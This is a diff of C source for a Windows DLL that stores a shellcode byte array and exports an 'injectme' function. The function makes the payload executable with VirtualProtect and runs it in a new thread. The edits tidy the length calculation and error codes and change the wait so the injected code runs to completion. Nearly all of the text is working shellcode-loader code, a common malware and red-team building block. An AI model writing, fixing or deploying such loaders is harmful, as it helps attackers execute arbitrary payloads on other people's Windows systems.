@@ -35,7 +35,7 @@ unsigned char payload[] =
     "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
     "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
 
-unsigned int payload_len = 434;
+size_t payload_len = sizeof(payload);
 
 
 extern __declspec(dllexport) int injectme(void) {
@@ -69,7 +69,7 @@ extern __declspec(dllexport) int injectme(void) {
 
     if (!retval) {
         fprintf(stderr, "[!] VirtualProtect() failed (0x%x)\n", GetLastError());
-        return -2;
+        return -1;
     }
 
     // See: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
@@ -84,15 +84,15 @@ extern __declspec(dllexport) int injectme(void) {
 
     if (hThread == INVALID_HANDLE_VALUE) {
         fprintf(stderr, "[!] CreateThread() failed (0x%x)\n", GetLastError());
-        return -3;
+        return -1;
     }
 
     // Wait for thread to finish
-    int _result = WaitForSingleObject(hThread, 0);
+    int _result = WaitForSingleObject(hThread, -1);
     if (_result != 0) {
         fprintf(stderr, "[!] WaitForSingleObject() failed (0x%x) with code 0x%x\n", GetLastError(), _result);
         CloseHandle(hThread);        
-        return -4;
+        return -1;
     } 
 
     CloseHandle(hThread);
